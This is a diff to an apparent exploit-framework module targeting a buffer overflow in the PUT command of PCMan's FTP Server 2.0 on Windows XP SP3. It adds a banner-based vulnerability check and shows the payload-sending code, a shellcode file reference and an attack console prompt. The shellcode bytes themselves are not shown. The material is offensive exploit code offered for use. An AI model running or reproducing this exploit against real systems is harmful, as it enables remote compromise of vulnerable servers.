@@ -18,8 +18,14 @@ class pcmanPutOverflowMenu(core.Exploit):
     s.recv(1024)
     s.send("PUT " + p)
     self.disconnect(s)
+  def check(self):
+    self.disconnect(self.connect())
+    if self.buffer[0] == "220 PCMan's FTP Server 2.0":
+      self.check_vuln()
+    else:
+      self.check_safe()
 def main():
-  pcmanputoverflowmenu = pcmanPutOverflowMenu('pcman_put_overflow', 'Windows XP SP3 English', 'pcman_put.shell', {'user':'anonymous', 'passwd':'anonymous@example.com', 'host':''}, {'user':'the user to login as', 'passwd':'the password to use to login', 'host':'the ip of the target'})
+  pcmanputoverflowmenu = pcmanPutOverflowMenu('pcman_put_overflow', 'Windows XP SP3 English', 'pcman_put.shell', {'user':'anonymous', 'passwd':'anonymous@example.com', 'host':''}, {'user':'the user to login as', 'passwd':'the password to use to login', 'host':'the ip of the target'}, [True])
   pcmanputoverflowmenu.cmdloop("pdf-console attack(pcman_put_overflow)% ")
 if __name__ == '__main__':
   main()
